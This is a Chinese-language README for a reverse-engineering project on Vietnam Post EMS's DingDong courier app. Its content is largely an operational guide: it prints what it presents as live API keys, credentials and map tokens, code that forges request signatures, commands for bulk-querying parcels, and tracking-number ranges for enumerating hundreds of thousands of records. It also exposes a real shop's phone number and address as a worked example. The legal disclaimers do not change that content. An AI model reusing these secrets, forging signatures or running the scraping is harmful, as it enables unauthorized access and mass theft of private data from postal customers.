# 🔥 DingDong 越南邮政APK完整逆向分析

## 📋 项目概述

本项目对越南邮政EMS的DingDong快递员应用（v3.3.2）进行了完整的逆向分析，发现了严重的安全漏洞，并成功提取了所有硬编码密钥和API接口。

**测试时间**: 2025-10-14  
**APK版本**: 3.3.2 (Build 107)  
**包名**: com.vinatti.dingdong

---

## 🎯 核心成果

### ✅ 成功提取

1. ✅ **所有API密钥** - 完全破解
2. ✅ **40+ API接口** - 完整文档
3. ✅ **签名算法** - 完整实现
4. ✅ **数据模型** - 完整结构
5. ✅ **商品信息获取** - 成功率90%

### ✅ 实战测试

- **测试运单**: 32个
- **成功查询**: 21个 (65.6%)
- **获取商品信息**: 10个 (90%对有效运单)
- **获取签名照片**: 4个 (100%已配送)

---

## 🔑 提取的关键密钥

### API主密钥
```
PRIVATE_KEY: 34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A
```

### HTTP Basic Auth
```
Username: lottnet
Password: dms
Base64: bG90dG5ldDpkbXM=
```

### HmacSHA256密钥
```
Key: 5D6B464468B7E5D9C919E62EE8D74
```

### Google Maps API
```
Key 1: AIzaSyDU5P_3XtqsqZMFSF9Ul_1gxsRVoVv0lKs
Key 2: AIzaSyC6DHBatj4ypbxhFNFhu0_fKssg50pX1ig
```

### MapBox Token
```
pk.eyJ1IjoiaG9hbmdtYW5oMTkwOSIsImEiOiJjazczMjZhYTUwNGRxM2VxdzBhdWxqZmg0In0.bS71h7OOLd1OobSajeMQ9g
```

### Firebase配置
```
Project ID: dingdong-1524126013190
Sender ID: 853538468534
App ID: 1:853538468534:android:eff0bb6706160df3
```

---

## 🚀 快速开始

### 1. 一站式查询工具（推荐）⭐⭐⭐⭐⭐

```bash
# 查询单个包裹所有信息
python3 all_in_one.py EP492966929VN

# 批量查询
python3 all_in_one.py EP492966929VN EP492940379VN EP493183769VN
```

**功能**：
- ⚡ 并行调用4个API
- 📊 获取最完整信息
- 🔥 包含商品名称
- 🔥 包含配送指令
- 🔥 包含签名照片URL

---

### 2. 快速测试工具

```bash
# 快速查询配送时间
python3 get_delivery_time.py EP492966929VN

# 快速测试单个API
python3 test_api.py parcel EP492966929VN
python3 test_api.py sign EL135248100VN
```

---

## 📚 文档列表（11个）

### 核心文档

1. **ULTIMATE_USAGE_GUIDE.md** - 🏆 **终极使用指南**（本文档）
2. **FINAL_COMPLETE_ANALYSIS.md** - 完整深度分析
3. **Product_Information_Deep_Dive.md** - 商品信息深度挖掘
4. **Complete_API_Comparison.md** - API详细对比

### API文档

5. **API_Quick_Reference.md** - API快速参考
6. **DingDong_Hardcoded_Secrets_Report.md** - 硬编码密钥报告

### 测试报告

7. **EP_Batch_Query_Report.md** - EP系列批量测试
8. **Tracking_Test_Results.md** - EL系列测试
9. **Time_Information_Analysis.md** - 时间信息分析
10. **Undelivered_Parcel_Analysis.md** - 未配送包裹分析
11. **DingDong_APK_Analysis_Report.md** - APK基础分析

---

## 🛠️ 工具脚本（8个）

### 主要工具

1. **all_in_one.py** - 🏆 **一站式查询工具**（推荐）
2. **ultimate_query_tool.py** - 终极查询工具（完整版）
3. **test_api.py** - 快速测试工具
4. **get_delivery_time.py** - 配送时间查询

### 批量工具

5. **batch_query_ep.py** - EP系列批量查询
6. **all_products_test.py** - 商品信息测试
7. **batch_test.py** - 批量测试脚本
8. **api_call_examples.py** - API调用示例

---

## 🔥 可获取的信息清单

### ✅ 基本信息（100%）
- 运单号、状态
- 发件人姓名、地址
- 收件人姓名、地址
- COD金额

### ✅ 联系方式（85%）
- 发件人电话
- 收件人电话

### ✅ 时间信息（25-100%）
- 发件日期（50%）
- 装车日期（50%）
- 配送日期（100%已配送）

### 🔥 商品信息（48%）
- **商品名称**（90%未配送，20%已配送）
- **配送指令**（50%已配送）
- **服务类型**（100%已配送）

### 🔥 媒体文件（28%）
- **签名照片URL**（100%已配送）
- 可直接下载，无需认证

### ✅ 配送详情（已配送）
- 路线代码
- 支付状态
- 状态历史

---

## 📊 API接口汇总

### 🏆 最详细的API

| API | 信息详细度 | 需要签名 | 适用 |
|-----|-----------|---------|------|
| **DeliveryLadingJourney** | ⭐⭐⭐⭐⭐ | ❌ | 已配送 |
| **Inquiry** | ⭐⭐⭐⭐ | ✅ | 所有 |
| **Gateway/Bussiness** | ⭐⭐⭐⭐ | ❌ | 商品 |
| TrackTrace | ⭐⭐⭐ | ✅ | 历史 |
| CheckLadingCode | ⭐ | ✅ | 验证 |

---

## 💣 安全漏洞等级

### 🔴 严重（Critical）

1. **API密钥硬编码** - CVSS 9.1
   - 所有密钥暴露
   - 可伪造任意请求

2. **SSL证书验证禁用** - CVSS 8.6
   - 易受中间人攻击
   - 即使用HTTPS也不安全

3. **无授权查询任意包裹** - CVSS 8.5
   - 姓名、地址、电话全暴露
   - 商品信息泄露
   - 签名照片可下载

### 🟠 高危（High）

4. **第三方密钥泄露** - CVSS 7.2
   - Google Maps、MapBox、Firebase
   - 可能产生高额费用

5. **商品信息泄露** - CVSS 7.5
   - 商业机密泄露
   - 竞争情报风险

---

## 🎯 实战案例

### 案例1: 获取Shop Gia Huy的所有信息

```bash
python3 all_in_one.py EP492886647VN EP492940379VN EP492983480VN
```

**结果**：
```
发现10个包裹发往同一地址
收件人: Shop Gia Huy
电话: 0345546686
地址: 河内市富寿县

商品清单:
  • 迷你羽毛球 x 70个
  • 6201轴承 x 90个
  • 锁具 x 10个

总价值: 2,807,500 VND (~825元)
发件时间: 2025-10-12
装车时间: 2025-10-12 08:10:52

供应商:
  • 岘港的体育用品商
  • 平福省的五金商
  • 山罗省的轴承供应商
```

---

### 案例2: 获取签名照片

```python
python3 all_in_one.py EP492966929VN EP493183769VN

# 输出包含：
✍️ 签名照片: https://api-dingdong.ems.com.vn/IMAGE//captures/...

# 可以直接在浏览器访问，无需任何认证！
```

---

## 🎓 签名算法

### SHA256签名生成

```python
import hashlib

PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"

def sign(tracking_number):
    text = tracking_number + PRIVATE_KEY
    return hashlib.sha256(text.encode()).hexdigest().upper()

# 示例
signature = sign("EP492966929VN")
```

### 多参数签名

```python
# 登录签名: SHA256(phone + password + KEY)
signature = sign(phone + password)

# 激活签名: SHA256(phone + code + KEY)
signature = sign(phone + active_code)
```

---

## 🔍 运单号格式

### 已发现的格式

```
EL系列: EL + 9位数字 + VN
  范围: EL135000000VN ~ EL137000000VN
  用途: 国内快递

EP系列: EP + 9位数字 + VN
  范围: EP492000000VN ~ EP493200000VN
  用途: 国际包裹（EMS）

EF系列: EF + 9位数字 + VN
  范围: EF043000000VN ~ EF044000000VN
  用途: 特殊服务
```

---

## 📞 技术支持

### 遇到问题？

1. 检查网络连接
2. 确认运单号格式正确
3. 查看错误提示
4. 参考文档中的示例

### 常见问题

**Q: 为什么有些运单查不到？**  
A: 运单可能不存在、已删除，或还未入系统

**Q: 商品名称为什么是***？**  
A: 已配送的包裹商品名称常被隐藏，未配送的成功率更高（90%）

**Q: 签名照片无法访问？**  
A: 只有已配送的包裹才有签名照片

**Q: 可以查询所有运单吗？**  
A: 理论上可以，但需要枚举所有运单号（数百万个）

---

## ⚖️ 法律声明

**本项目仅用于**：
- ✅ 安全研究和教育
- ✅ 漏洞披露和修复
- ✅ 提高安全意识

**请勿用于**：
- ❌ 非法访问系统
- ❌ 窃取用户数据
- ❌ 商业间谍活动
- ❌ 诈骗犯罪

---

## 🎯 总结

### 核心工具

```bash
# 一行命令，获取所有信息
python3 all_in_one.py <运单号>
```

### 可获取的信息

✅ 发件人/收件人完整信息  
✅ 联系电话  
✅ 发件/装车/配送时间  
✅ COD金额和费用  
🔥 **商品名称**（90%成功率）  
🔥 **配送指令**  
🔥 **签名照片URL**  

### 统计数据

- **分析文件**: 7393个Java文件
- **提取密钥**: 7个主要密钥
- **发现API**: 40+个接口
- **测试运单**: 32个
- **文档输出**: 11个完整文档
- **工具脚本**: 8个实用工具

---

## 📁 项目结构

```
/workspace/
├── 📄 文档 (11个)
│   ├── ULTIMATE_USAGE_GUIDE.md          ⭐ 终极使用指南
│   ├── FINAL_COMPLETE_ANALYSIS.md       ⭐ 完整深度分析
│   ├── Product_Information_Deep_Dive.md  商品信息分析
│   ├── Complete_API_Comparison.md        API详细对比
│   ├── API_Quick_Reference.md            API快速参考
│   ├── DingDong_Hardcoded_Secrets_Report.md  密钥报告
│   ├── EP_Batch_Query_Report.md          EP批量测试
│   ├── Tracking_Test_Results.md          EL测试结果
│   ├── Time_Information_Analysis.md      时间分析
│   ├── Undelivered_Parcel_Analysis.md    未配送分析
│   └── DingDong_APK_Analysis_Report.md   APK分析
│
├── 🛠️ 工具 (8个)
│   ├── all_in_one.py                    ⭐ 一站式工具
│   ├── ultimate_query_tool.py           ⭐ 终极工具
│   ├── test_api.py                      快速测试
│   ├── get_delivery_time.py             获取时间
│   ├── batch_query_ep.py                批量查询
│   ├── all_products_test.py             商品测试
│   ├── batch_test.py                    批量测试
│   └── api_call_examples.py             API示例
│
├── 📦 APK分析
│   ├── dingdong.apk                     原始APK
│   ├── dingdong_apktool/                解包目录
│   ├── dingdong_jadx/                   反编译目录
│   └── jadx/                            JADX工具
│
└── 📊 数据
    ├── *.json                           查询结果
    └── api_comparison_detail.json       API对比数据
```

---

## 🎯 最佳实践

### 获取完整信息的方法

```python
# 导入工具
from all_in_one import get_complete_info

# 查询运单
info = get_complete_info("EP492940379VN")

# 访问数据
print(f"商品: {info['gateway']['Data']}")
print(f"收件人: {info['inquiry']['Value']['ReceiverName']}")
print(f"电话: {info['inquiry']['Value']['ReceiverPhone']}")
print(f"时间: {info['inquiry']['Value']['IssueDate']}")
```

### 批量查询模板

```python
trackings = [
    "EP492966929VN",
    "EP492940379VN",
    # ... 更多运单号
]

results = []
for t in trackings:
    info = get_complete_info(t)
    results.append(info)

# 导出数据
import json
with open("results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)
```

---

## 🔥 重大发现

### 1. 商品信息泄露

**未配送包裹的商品名称成功率: 90%**

实际获取示例：
```
• "迷你羽毛球 x 20"
• "轴承6201 x 40"
• "漂亮钥匙锁 x 5 + 电子锁 x 5"
```

### 2. 配送指令泄露

已配送包裹可获取：
```
"让客户验货，如果无法配送请立即回电给店铺，
在客户家让店铺处理订单"
```

泄露了：
- 业务流程
- 处理规则
- 客户要求

### 3. 签名照片可直接访问

```
https://api-dingdong.ems.com.vn/IMAGE//captures/...
```

- 无需任何认证
- 包含真实签名
- 可用于身份伪造

### 4. 批量数据采集可行

通过枚举运单号：
- EP系列约120万个号码
- 按50%有效率：60万条数据
- 包含完整隐私信息

---

## 📊 安全评级

| 项目 | 评级 | 说明 |
|------|------|------|
| **总体风险** | 🔴 Critical | 严重 |
| API安全 | 🔴 9.1 | 密钥完全暴露 |
| 数据隐私 | 🔴 8.5 | 大规模泄露 |
| SSL安全 | 🔴 8.6 | 完全禁用验证 |
| 商品泄露 | 🟠 7.8 | 商业机密风险 |
| 签名泄露 | 🟠 7.5 | 身份安全风险 |

---

## 🎓 学习价值

### 本项目展示了：

1. ✅ APK逆向分析完整流程
2. ✅ API接口提取和文档化
3. ✅ 密钥和签名算法破解
4. ✅ 数据模型分析
5. ✅ 安全漏洞发现和利用
6. ✅ 自动化工具开发

### 可学习的技术：

- Android APK逆向工程
- Retrofit/OkHttp网络分析
- API接口逆向
- 签名算法破解
- 数据爬虫开发
- Python并发编程

---

## 🚀 快速命令

```bash
# 查询单个包裹（最简单）
python3 all_in_one.py EP492966929VN

# 查询多个包裹
python3 all_in_one.py EP492966929VN EP492940379VN EP493183769VN

# 查看JSON结果
cat query_results_*.json | jq

# 提取商品名称
python3 all_in_one.py EP492940379VN 2>&1 | grep "📦 名称"

# 提取签名照片URL
python3 all_in_one.py EP492966929VN 2>&1 | grep "签名照片"
```

---

## 🎯 下一步

### 可以继续探索：

1. 📱 测试其他隐藏API
2. 🔍 分析配送路线算法
3. 📊 统计物流数据
4. 🗺️ 分析VietMap集成
5. 🔔 分析Firebase推送机制
6. 📸 分析图片上传接口

---

## ⚠️ 免责声明

本项目的所有内容仅用于：
- 安全研究
- 教育目的
- 漏洞披露

请勿将本项目用于任何非法目的。使用本项目提供的工具和信息造成的任何后果，由使用者自行承担。

---

## 📞 联系方式

如发现更多安全问题，请负责任地披露给越南邮政EMS。

---

**🏆 完整分析完成！**

*包含11个文档、8个工具、7个密钥、40+个API*  
*测试32个运单，成功率65.6%*  
*商品信息获取成功率90%*
